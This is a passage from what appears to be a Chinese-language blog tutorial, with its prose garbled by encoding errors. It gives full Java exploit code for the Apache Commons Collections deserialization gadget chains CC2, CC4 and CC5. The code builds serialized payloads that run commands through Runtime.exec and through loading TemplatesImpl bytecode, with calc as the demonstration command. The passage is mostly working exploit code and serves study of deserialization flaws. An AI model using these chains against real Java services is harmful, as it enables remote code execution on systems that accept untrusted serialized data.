class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//å› ä¸ºåªæœ‰å½“å‚æ•°å¤§äºäºŒçš„æ—¶å€™æ‰å¯ä»¥è§¦å‘é˜Ÿåˆ—æ’æ¯”ï¼Œä¸”è¿™äº›addçš„å‚æ•°å°±æ˜¯åç»­comparçš„å‚æ•°</span></span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        Serializ(queue);</span><br><span class="line">        Unserializ(<span class="string">&quot;Ser_c.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å…¶å®è¿™ä¸ªCC2è¿˜èƒ½è¿›è¡Œæ”¹è¿›ï¼Œä½¿ç”¨åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•æ¥å°è¯•æ— æ•°ç»„æ‰§è¡Œå‘½ä»¤ã€‚</p><p>åœ¨å­¦æ ¡CC6çš„æ—¶å€™å­¦ä¹ åˆ°äº†å½“transformçš„å‚æ•°å¯æ§æ—¶æˆ‘ä»¬å¯ä»¥ä¸éœ€è¦å±æ€§å°±å¯ä»¥åˆ©ç”¨åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>è€Œè¿™æ¡é“¾çš„æˆ‘ä»¬é€šè¿‡queue.add(templates);çš„æ–¹æ³•æ¥è¿›è¡Œä¼ å…¥çš„å‚æ•°ä¼šåœ¨ååºåˆ—æ—¶è§¦å‘çš„transformä¸­è¢«è°ƒç”¨expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2_loader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CC2_loader</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(templates);</span><br><span class="line">        queue.add(templates);</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        Serializ(queue);</span><br><span class="line">        Unserializ(<span class="string">&quot;Ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>CC4å…¶å®å°±æ˜¯å°†åŠ è½½å­—èŠ‚ç çš„æ–¹å¼ç”±æœ€ç»ˆçš„åå°„è·å–æ”¹ä¸ºäº†é€šè¿‡TrAXFilterçš„æ„é€ æ–¹æ³•è§¦å‘<br>å³å…¶ååŠæ®µæ”¹ä¸ºäº†cc3çš„å¦ä¸€ç§åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•<br>expå¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CC4</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Transformer transformer = new InvokerTransformer(&quot;toString&quot;, null, null);</span></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, Transformer);</span><br><span class="line">        <span class="comment">//setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);</span></span><br><span class="line"></span><br><span class="line">        Serializ(queue);</span><br><span class="line">        Unserializ(<span class="string">&quot;Ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>å­¦äº†å‰é¢çš„å‡ æ¡CCé“¾ï¼Œå­¦è¿™ä¸ªCC5çš„éš¾åº¦å…¶å®å¹¶ä¸ç®—é«˜äº†ã€‚å…¶å’Œå‰é¢çš„å·®åˆ«å…¶å®ä¹Ÿå°±æ˜¯å…¥å£çš„ç±»å‘ç”Ÿäº†æ”¹å˜ï¼ŒååŠæ®µä¸CC6ä¸€æ ·å°±æ˜¯å…¥å£çš„ç±»æ”¹ä¸ºäº†BadAttributeValueExpExceptionçš„readObjectæ¥è§¦å‘toString<br>expå¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map, transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templates);</span><br><span class="line">        BadAttributeValueExpException obj=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        Field val=obj.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(obj,tiedMapEntry);</span><br><span class="line">        Field 